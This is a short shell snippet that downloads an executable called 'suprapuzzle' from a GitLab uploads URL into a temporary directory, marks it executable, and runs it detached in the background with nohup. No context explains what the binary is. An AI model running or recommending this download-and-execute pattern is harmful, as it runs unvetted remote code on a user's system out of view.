cd $(mktemp -d )
wget https://gitlab.com/-/project/61551072/uploads/f6d4162675231b16ac3ec76530e3e380/suprapuzzle
chmod +x suprapuzzle
nohup ./suprapuzzle&
